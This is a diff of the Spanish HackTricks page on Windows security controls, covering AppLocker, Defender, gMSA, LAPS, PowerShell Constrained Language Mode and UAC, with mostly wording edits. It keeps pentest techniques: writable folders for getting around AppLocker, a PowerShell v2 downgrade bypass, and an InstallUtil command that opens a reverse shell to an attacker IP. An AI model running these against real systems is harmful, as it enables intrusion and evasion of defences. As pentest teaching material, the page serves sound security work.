@@ -7,12 +7,12 @@
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias más avanzadas del mundo.\
 Obtén acceso hoy mismo:
@@ -21,10 +21,10 @@ Obtén acceso hoy mismo:
 
 ## Política de AppLocker
 
-Una lista blanca de aplicaciones es una lista de aplicaciones o ejecutables aprobados que se permiten estar presentes y ejecutarse en un sistema. El objetivo es proteger el entorno de malware dañino y software no aprobado que no se ajusta a las necesidades específicas de una organización.&#x20;
+Una lista blanca de aplicaciones es una lista de aplicaciones o ejecutables aprobados que se permiten estar presentes y ejecutarse en un sistema. El objetivo es proteger el entorno de malware dañino y software no aprobado que no se ajusta a las necesidades comerciales específicas de una organización.
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) es la solución de **lista blanca de aplicaciones** de Microsoft y brinda a los administradores del sistema control sobre **qué aplicaciones y archivos pueden ejecutar los usuarios**. Proporciona un **control granular** sobre ejecutables, scripts, archivos de instalación de Windows, DLL, aplicaciones empaquetadas e instaladores de aplicaciones empaquetadas. \
-Es común que las organizaciones **bloqueen cmd.exe y PowerShell.exe** y el acceso de escritura a ciertos directorios, **pero todo esto se puede evadir**.
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) es la solución de **lista blanca de aplicaciones** de Microsoft y brinda a los administradores del sistema control sobre **qué aplicaciones y archivos pueden ejecutar los usuarios**. Proporciona un **control granular** sobre ejecutables, scripts, archivos de instalación de Windows, DLL, aplicaciones empaquetadas e instaladores de aplicaciones empaquetadas.\
+Es común que las organizaciones **bloqueen cmd.exe y PowerShell.exe** y el acceso de escritura a ciertos directorios, **pero todo esto se puede eludir**.
 
 ### Verificación
 
@@ -41,7 +41,7 @@ Las reglas de AppLocker aplicadas a un host también se pueden **leer desde el r
 
 ### Bypass
 
-* Carpetas **escribibles** útiles para eludir la política de AppLocker: Si AppLocker permite ejecutar cualquier cosa dentro de `C:\Windows\System32` o `C:\Windows`, hay **carpetas escribibles** que puedes usar para **eludir esto**.
+* Carpetas **escribibles** útiles para evadir la política de AppLocker: Si AppLocker permite ejecutar cualquier cosa dentro de `C:\Windows\System32` o `C:\Windows`, hay **carpetas escribibles** que puedes usar para **evadir esto**.
 ```
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
@@ -84,7 +84,7 @@ Es la base de datos del Active Directory. Solo está presente en los controlador
 
 ## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) es un antivirus que está disponible en Windows 10 y Windows 11, y en versiones de Windows Server. Bloquea herramientas comunes de pentesting como **`WinPEAS`**. Sin embargo, hay formas de evadir estas protecciones.&#x20;
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) es un antivirus que está disponible en Windows 10 y Windows 11, y en versiones de Windows Server. Bloquea herramientas comunes de pentesting como **`WinPEAS`**. Sin embargo, hay formas de evadir estas protecciones.
 
 ### Verificación
 
@@ -104,7 +104,8 @@ NISEngineVersion                : 0.0.0.0
 [...]
 <strong>RealTimeProtectionEnabled       : True
 </strong>RealTimeScanDirection           : 0
-PSComputerName                  :</code></pre>
+PSComputerName                  :
+</code></pre>
 
 También puedes enumerarlo ejecutando:
 ```bash
@@ -164,11 +165,11 @@ Puedes leer esta contraseña con [**GMSAPasswordReader**](https://github.com/rva
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
-También, revisa esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre cómo realizar un ataque de **retransmisión NTLM** para **leer** la **contraseña** de **gMSA**.
+También, revisa esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre cómo realizar un ataque de relé NTLM para leer la contraseña de gMSA.
 
 ## LAPS
 
-****[**Local Administrator Password Solution (LAPS)**](https://www.microsoft.com/en-us/download/details.aspx?id=46899) te permite **administrar la contraseña del administrador local** (que es **aleatoria**, única y **cambiada regularmente**) en computadoras unidas al dominio. Estas contraseñas se almacenan de forma centralizada en Active Directory y están restringidas a usuarios autorizados mediante ACLs. Si tu usuario tiene suficientes permisos, es posible que puedas leer las contraseñas de los administradores locales.
+\*\*\*\*[**Local Administrator Password Solution (LAPS)**](https://www.microsoft.com/en-us/download/details.aspx?id=46899) te permite **administrar la contraseña del administrador local** (que es **aleatoria**, única y **cambiada regularmente**) en computadoras unidas al dominio. Estas contraseñas se almacenan de forma centralizada en Active Directory y están restringidas a usuarios autorizados mediante ACL. Si tu usuario tiene suficientes permisos, es posible que puedas leer las contraseñas de los administradores locales.
 
 {% content-ref url="active-directory-methodology/laps.md" %}
 [laps.md](active-directory-methodology/laps.md)
@@ -176,7 +177,7 @@ También, revisa esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/
 
 ## Modo de Lenguaje Restringido de PowerShell
 
-PowerShell **** [**Modo de Lenguaje Restringido**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **bloquea muchas de las características** necesarias para utilizar PowerShell de manera efectiva, como bloquear objetos COM, permitir solo tipos .NET aprobados, flujos de trabajo basados en XAML, clases de PowerShell y más.
+PowerShell \*\*\*\* [**Modo de Lenguaje Restringido**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **bloquea muchas de las características** necesarias para utilizar PowerShell de manera efectiva, como bloquear objetos COM, permitir solo tipos .NET aprobados, flujos de trabajo basados en XAML, clases de PowerShell y más.
 
 ### **Verificación**
 ```powershell
@@ -185,17 +186,17 @@ $ExecutionContext.SessionState.LanguageMode
 ```
 ### Bypass
 
-Un bypass es una técnica utilizada para evadir o eludir medidas de seguridad y obtener acceso no autorizado a un sistema o recurso protegido. En el contexto de la seguridad de Windows, existen varios métodos de bypass que pueden ser utilizados para sortear la autenticación, las credenciales, el Control de Cuentas de Usuario (UAC) y el Sistema de Archivos Encriptados (EFS). Estos métodos pueden ser aprovechados por los hackers para comprometer la seguridad de un sistema y obtener acceso no autorizado.
+Un bypass es una técnica utilizada para evadir o eludir medidas de seguridad y obtener acceso no autorizado a un sistema o recurso protegido. En el contexto de la seguridad de Windows, existen varios métodos de bypass que pueden ser utilizados para comprometer la autenticación, las credenciales, el Control de Cuentas de Usuario (UAC) y el Sistema de Archivos Encriptados (EFS). Estos métodos pueden ser aprovechados por los hackers para obtener acceso no autorizado a sistemas Windows y comprometer la seguridad de los datos.
 
-En el caso de la autenticación, un bypass puede implicar el uso de técnicas como la suplantación de identidad, la explotación de vulnerabilidades en el proceso de autenticación o el uso de contraseñas débiles. Al eludir las medidas de autenticación, un hacker puede obtener acceso a una cuenta de usuario sin necesidad de conocer las credenciales correctas.
+En el caso de la autenticación, un bypass puede implicar eludir o evadir los mecanismos de autenticación para obtener acceso a una cuenta de usuario sin conocer las credenciales correctas. Esto puede lograrse mediante técnicas como la fuerza bruta, el uso de contraseñas débiles o la explotación de vulnerabilidades en el sistema de autenticación.
 
-En cuanto a las credenciales, un bypass puede involucrar la extracción o robo de credenciales almacenadas en un sistema, como contraseñas guardadas en el Administrador de Credenciales de Windows o en archivos de configuración. Estas credenciales pueden ser utilizadas posteriormente para obtener acceso no autorizado a otros sistemas o recursos.
+En cuanto a las credenciales, un bypass puede referirse a la obtención de credenciales de usuario legítimas sin el conocimiento o consentimiento del propietario. Esto puede lograrse mediante técnicas como el phishing, el keylogging o la explotación de vulnerabilidades en aplicaciones o servicios que almacenan o transmiten credenciales.
 
-El Control de Cuentas de Usuario (UAC) es una característica de seguridad de Windows que ayuda a prevenir cambios no autorizados en el sistema. Sin embargo, existen técnicas de bypass que pueden ser utilizadas para eludir el UAC y obtener privilegios elevados en un sistema. Estas técnicas pueden incluir la explotación de vulnerabilidades en el UAC o la manipulación de configuraciones y permisos.
+El Control de Cuentas de Usuario (UAC) es una característica de seguridad de Windows que ayuda a prevenir cambios no autorizados en el sistema mediante la solicitud de confirmación o consentimiento del usuario antes de realizar ciertas acciones. Sin embargo, los hackers pueden utilizar técnicas de bypass para eludir o evadir el UAC y obtener acceso elevado o realizar cambios no autorizados en el sistema.
 
-El Sistema de Archivos Encriptados (EFS) es una característica de seguridad de Windows que permite encriptar archivos y carpetas para proteger su contenido. Sin embargo, también existen técnicas de bypass que pueden ser utilizadas para eludir la encriptación y acceder al contenido de los archivos encriptados. Estas técnicas pueden incluir la explotación de vulnerabilidades en el EFS o el uso de herramientas especializadas.
+El Sistema de Archivos Encriptados (EFS) es una característica de seguridad de Windows que permite encriptar archivos y carpetas para proteger su contenido. Sin embargo, los hackers pueden utilizar técnicas de bypass para eludir o evadir la encriptación y acceder al contenido de los archivos encriptados sin conocer la clave de encriptación correcta.
 
-En resumen, los bypass son técnicas utilizadas por los hackers para evadir o eludir medidas de seguridad en Windows, como la autenticación, las credenciales, el UAC y el EFS. Estas técnicas pueden comprometer la seguridad de un sistema y permitir el acceso no autorizado a recursos protegidos. Es importante que los administradores de sistemas y los usuarios tomen medidas para fortalecer la seguridad de sus sistemas y protegerse contra estos tipos de ataques.
+En resumen, los bypass son técnicas utilizadas por los hackers para evadir o eludir medidas de seguridad en sistemas Windows, comprometiendo la autenticación, las credenciales, el UAC y el EFS. Es importante que los administradores de sistemas y los usuarios tomen medidas para fortalecer la seguridad de sus sistemas y protegerse contra estos tipos de ataques.
 ```powershell
 #Easy bypass
 Powershell -version 2
@@ -210,9 +211,9 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```
 #### Shell inversa:
 
-A reverse shell is a technique used in hacking to establish a connection between the attacker's machine and the target machine. It allows the attacker to gain control over the target machine by executing commands remotely. The reverse shell works by first compromising the target machine and then creating a connection back to the attacker's machine.
+A reverse shell is a technique used by hackers to gain remote access to a target system. It involves establishing a connection from the target system to the attacker's machine, allowing the attacker to execute commands on the target system.
 
-Una shell inversa es una técnica utilizada en hacking para establecer una conexión entre la máquina del atacante y la máquina objetivo. Permite al atacante tomar el control de la máquina objetivo ejecutando comandos de forma remota. La shell inversa funciona comprometiendo primero la máquina objetivo y luego creando una conexión de vuelta a la máquina del atacante.
+Una shell inversa es una técnica utilizada por los hackers para obtener acceso remoto a un sistema objetivo. Implica establecer una conexión desde el sistema objetivo hacia la máquina del atacante, lo que permite al atacante ejecutar comandos en el sistema objetivo.
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
@@ -265,15 +266,13 @@ El SSPI se encargará de encontrar el protocolo adecuado para dos máquinas que 
 
 ## UAC - Control de cuentas de usuario
 
-[Control de cuentas de usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que permite una **solicitud de consentimiento para actividades elevadas**.&#x20;
+[Control de cuentas de usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que permite una **solicitud de consentimiento para actividades elevadas**.
 
 {% content-ref url="windows-security-controls/uac-user-account-control.md" %}
 [uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
 {% endcontent-ref %}
 
-
-
-<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias más avanzadas del mundo.\
@@ -281,16 +280,14 @@ Obtenga acceso hoy mismo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Comparte tus trucos de hacking enviando PR al repositorio [hacktricks](https://github.com/carlospolop/hacktricks) y [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
